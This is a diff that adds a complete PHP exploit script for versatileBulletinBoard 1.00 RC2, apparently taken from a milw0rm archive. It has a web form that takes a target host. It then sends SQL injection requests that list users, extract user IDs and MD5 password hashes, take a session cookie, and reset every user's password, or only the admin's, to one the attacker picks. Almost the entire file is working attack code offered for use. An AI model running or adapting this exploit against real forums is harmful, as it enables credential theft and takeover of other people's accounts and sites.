@@ -1,0 +1,292 @@
+<?php
+#   --- versatile_xpl.php                                    4.08 11/10/2005   #
+#                                                                              #
+#   versatileBulletinBoard 1.00 RC2 ( possibly prior versions) SQL injection / #
+#   board takeover                                                             #
+#                                                                              #
+#   this exploit describes the vulnerability described here:                   #
+#   http://rgod.altervista.org/versatile100RC2.html                            #
+#   with a change: with magic_quotes both on or off, you can reset admin pass  #
+#   (look STEP 2b...)                                                          #
+#                                                                              #
+#                                by rgod                                       #
+#                      site: http://rgod.altervista.org                        #
+#                                                                              #
+#   make these changes in php.ini if you have troubles                         #
+#   to launch this script:                                                     #
+#   allow_call_time_pass_reference = on                                        #
+#   register_globals = on                                                      #
+#                                                                              #
+#   usage: launch this script from Apache, fill requested fields, then         #
+#   reset any user / admin password right now!                                 #
+#                                                                              #
+#   Sun-Tzu: "Let your rapidity be that of the wind"                           #
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 2);
+ob_implicit_flush (1);
+
+echo'<html><head><title>versatileBulletinBoard 1.00 RC2 SQL Injection/board take
+over</title><meta http-equiv="Content-Type" content="text/html;charset=iso-8859-
+1"><style type="text/css"> body {background-color:#111111;SCROLLBAR-ARROW-COLOR:
+#ffffff;SCROLLBAR-BASE-COLOR: black;CURSOR: crosshair;color: #1CB081;}       img
+{background-color: #FFFFFF !important}input{background-color:#303030 !important}
+option{background-color:#303030 !important}textarea  {background-color:  #303030
+!important}input{color: #1CB081 !important} option   {color: #1CB081 !important}
+textarea {color:#1CB081 !important}checkbox{background-color:#303030 !important}
+select {font-weight: normal; color: #1CB081;  background-color:  #303030;}  body
+{font-size:8pt !important; background-color:#111111; body * {font-size:      8pt
+!important} h1 {font-size: 0.8em !important} h2 {font-size:0.8em  !important} h3
+{font-size: 0.8em !important}h4,h5,  h6{ font-size:  0.8em  !important} h1  font
+{font-size:  0.8em !important}h2 font  {font-size:  0.8em  !important} h3   font
+{font-size: 0.8em !important}h4 font,h5 font,h6 font{font-size:0.8em !important}
+* {font-style: normal !important} *{text-decoration: none !important}    a:link,
+a:active,a:visited{text-decoration:none;color:#999900;} a:hover{text-decoration:
+underline;color:#1CB081;}.Stile5{font-family:Verdana,Arial,Helvetica,sans-serif;
+font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
+font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
+versatileBulletinBoard 1.00 RC2 (possibly prior versions) SQL injection / board
+takeover </p><p class="Stile6"> a  script  by rgod  at <a href="http://rgod.alte
+rvista.org" target="_blank"> http://rgod.altervista.org</a></p><table width="84%
+">  <tr> <td  width="43%">        <form  name="form1"  method="post"  action="'.
+$SERVER[PHP_SELF].'?path=value&host=value&port=value&proxy=value&newpass=value&t
+able_prefix=value"><p><input type="text" name="host">      <span class="Stile5">
+hostname (ex: www.sitename.com)</span></p><p><input  type="text"    name="path">
+<span class="Stile5"> path (ex:/versatile/ or /forum/ or just /)</span></p>  <p>
+<input type="text" name="port"><span class="Stile5">specify a port other than 80
+(default value) </span> </p> <p> <input  type="text" name="table_prefix"  ><span
+class="Stile5">usually vbb (default value) or vbb_        </span></p> <p> <input
+type="text" name="newpass"><span class="Stile5">new password for all users!   ;)
+</span></p><p><input type="text" name="proxy"><span class="Stile5"> send exploit
+through an HTTP proxy (ip:port)</span></p><p><input  type="submit" name="Submit"
+value="go!"></p></form></td></tr></table></body></html>';
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '<table border="0"><tr>';
+while ($ii <= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo "<td>&nbsp;&nbsp;</td>";
+             for ($li=0; $li<=15; $li++)
+                      { echo "<td>".$headeri[$li+$ki]."</td>";
+			    }
+            $ki=$ki+16;
+            echo "</tr><tr>";
+            }
+if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
+{echo "<td>".$datai."</td> ";}
+$ii++;
+$ji++;
+}
+for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo "<td>&nbsp&nbsp</td>";
+                       }
+
+for ($li=$ci*16; $li<=strlen($headeri); $li++)
+                      { echo "<td>".$headeri[$li]."</td>";
+			    }
+echo "</tr></table>";
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket($packet)
+{
+global $proxy, $host, $port, $html;
+if ($proxy=='')
+           {$ock=fsockopen(gethostbyname($host),$port);
+            if (!$ock) { echo 'No response from '.htmlentities($host).'...';
+			die;
+		       }}
+
+             else
+           {
+	    if (!eregi($proxy_regex,$proxy))
+	    {echo htmlentities($proxy).' -> not a valid proxy...';
+	     die;
+	    }
+	   $parts=explode(':',$proxy);
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+	    $ock=fsockopen($parts[0],$parts[1]);
+	    if (!$ock) { echo 'No response from proxy...';
+			die;
+		       }
+	   }
+fputs($ock,$packet);
+if ($proxy=='')
+  {
+
+    $html='';
+    while (!feof($ock))
+      {
+        $html.=fgets($ock);
+      }
+  }
+else
+  {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+    {
+      $html.=fread($ock,1);
+    }
+  }
+fclose($ock);
+echo nl2br(htmlentities($html));
+}
+
+if (($path<>'') and ($host<>'') and ($newpass<>'') and ($table_prefix<>''))
+{
+
+if ($port=='') {$port=80;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+#STEP 1 -> List all users...
+$packet="GET ".$p."userlistpre.php?list='%20or%20isnull(1/0)/* HTTP/1.1\r\n";
+$packet.="Accept: */*\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: HeinrichderMiragoRobot\r\n";
+$packet.="Host: ".$host.":".$port."\r\n";
+$packet.="Connection: close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+if (!eregi("200 OK",$html)) {echo '<br> Exploit failed... nothing here...'; }
+$magic_q=0;
+if (!eregi('<br>',$html)) {echo '<br>It seems we have magic_quote_gpc On here...let\'s try to reset only admin password...';
+			   $magic_q=1;
+			  }
+if (!$magic_q)
+{
+$users=explode('<br>',$html);
+$temp=explode(' ',$users[0]);
+$users[0]=$temp[count($temp)-1];
+
+for ($i=0; $i<=count($users)-1; $i++) //each user...
+{
+  if  (!eregi('anonymous',$users[$i]) and !eregi('deleted',$users[$i]) and !eregi(chr(0x0d),$users[$i])) // default users, eof...
+  {
+    echo '<br>'.htmlentities($users[$i]).'<br>';
+
+    #STEP 2 -> retrieve user ID for user $users($i)
+    $packet="GET ".$p."index.php?target=viewmesg&select='UNION%20SELECT%20ID,ID,ID,ID";
+    $packet.=",ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID%20FROM%20".$table_prefix;
+    $packet.="_user%20where%20name='".$users[$i]."'/* HTTP/1.1\r\n";
+    $packet.="Accept: */*\r\n";
+    $packet.="Accept-Language: it\r\n";
+    $packet.="Accept-Encoding: gzip, deflate\r\n";
+    $packet.="User-Agent: FFC Trap Door Spider\r\n";
+    $packet.="Host: ".$host.":".$port."\r\n";
+    $packet.="Connection: close\r\n\r\n";
+    show($packet);
+    sendpacket($packet);
+
+    $temp=explode("subject: ",$html);
+    $temp2=explode("<",$temp[1]);
+    $uid=$temp2[0];
+    echo "<br> UID -> ".htmlentities($uid);
+
+    #STEP 3 -> retrieve MD5 password hash for user $users($i)
+    $packet="GET ".$p."index.php?target=viewmesg&select='UNION%20SELECT%20pass,pass,pass,pass";
+    $packet.=",pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass";
+    $packet.=",pass%20FROM%20".$table_prefix."_user%20where%20name='".$users[$i]."'/* HTTP/1.1\r\n";
+    $packet.="Accept: */*\r\n";
+    $packet.="Accept-Language: it\r\n";
+    $packet.="Accept-Encoding: gzip, deflate\r\n";
+    $packet.="User-Agent: Irvine/1.x.x\r\n";
+    $packet.="Host: ".$host.":".$port."\r\n";
+    $packet.="Connection: close\r\n\r\n";
+    show($packet);
+    sendpacket($packet);
+
+    $temp=explode("subject: ",$html);
+    $temp2=explode("<",$temp[1]);
+    $hash=$temp2[0];
+    echo "<br> hash -> ".htmlentities($hash);
+
+    #STEP 4 -> go to reset password panel and retrieve a session cookie
+    $packet="GET ".$p."index.php?target=setpass&u=".$uid."&ph=".$hash." HTTP/1.1\r\n";
+    $packet.="User-Agent: libwww-perl/5.53\r\n";
+    $packet.="Host: ".$host.":".$port."\r\n";
+    $packet.="Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n";
+    $packet.="Accept-Language: en\r\n";
+    $packet.="Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\r\n";
+    $packet.="Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\r\n";
+    $packet.="Connection: close, TE\r\n";
+    $packet.="TE: deflate, gzip, chunked, identity, trailers\r\n\r\n";
+    show($packet);
+    sendpacket($packet);
+    $temp=explode("Set-Cookie: ",$html);
+    $temp2=explode(' ',$temp[1]);
+    $cookie=$temp2[0]."path=/";
+    echo'<br>cookie: -> '.htmlentities($cookie).'<br><br>';
+
+
+    #STEP 5 -> reset the passoword to $newpass...
+    $newpass=urlencode($newpass);
+    $data="send=true&uid=".$uid."&newpass=".$newpass;
+    $packet="POST ".$p."index.php?target=setpass HTTP/1.1\r\n";
+    $packet.="User-Agent: W3C_Validator/1.xxx libwww-perl/5.xx\r\n";
+    $packet.="Host: ".$host.":".$port."\r\n";
+    $packet.="Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1";
+    $packet.="Accept-Language: en\r\n";
+    $packet.="Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\r\n";
+    $packet.="Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\r\n";
+    $packet.="Referer: http://".$host.":".$port.$path."index.php?target=setpass&u=".$uid."&ph=".$hash."\r\n";
+    $packet.="Cookie: ".$cookie."\r\n";
+    $packet.="Cookie2: \$Version=1\r\n";
+    $packet.="Connection: close, TE\r\n";
+    $packet.="TE: deflate, gzip, chunked, identity, trailers\r\n";
+    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n\r\n";
+    $packet.=$data;
+    show($packet);
+    sendpacket($packet);
+    if (eregi("password changed",$html))
+                       {echo "<br>Exploit successful...login with username: ".htmlentities($users[$i])." and password: ".htmlentities($newpass)."<br>";
+                        echo "<br> Remember to reset your cookies...<br>";}
+                    else
+                       {echo "<br> Exploit failed, something goes wrong or maybe you're Britney Spears ...";}
+}}}
+else
+{
+    #STEP 2b -> reset only admin passoword to $newpass...
+    $newpass=urlencode($newpass);
+    $data="send=true&uid=11&newpass=".$newpass;
+    $packet="POST ".$p."index.php?target=setpass HTTP/1.1\r\n";
+    $packet.="User-Agent: W3C_Validator/1.xxx libwww-perl/5.xx\r\n";
+    $packet.="Host: ".$host.":".$port."\r\n";
+    $packet.="Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1";
+    $packet.="Accept-Language: en\r\n";
+    $packet.="Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\r\n";
+    $packet.="Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\r\n";
+    $packet.="Referer: http://".$host.":".$port.$path."index.php?target=setpass&u=11&ph=\r\n";
+    $packet.="Cookie2: \$Version=1\r\n";
+    $packet.="Connection: close, TE\r\n";
+    $packet.="TE: deflate, gzip, chunked, identity, trailers\r\n";
+    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n\r\n";
+    $packet.=$data;
+    show($packet);
+    sendpacket($packet);
+    if (eregi("password changed",$html))
+                       {echo "<br>Exploit successful...look for admin username and login with password: ".htmlentities($newpass)."<br>";
+                       }
+                    else
+                       {echo "<br> Exploit failed, something goes wrong or maybe you're Britney Spears ...";}
+}
+}
+else
+{echo '<br>Fill in requested fields, optionally specify a proxy...';}
+
+?>
+
+# milw0rm.com [2005-10-10]
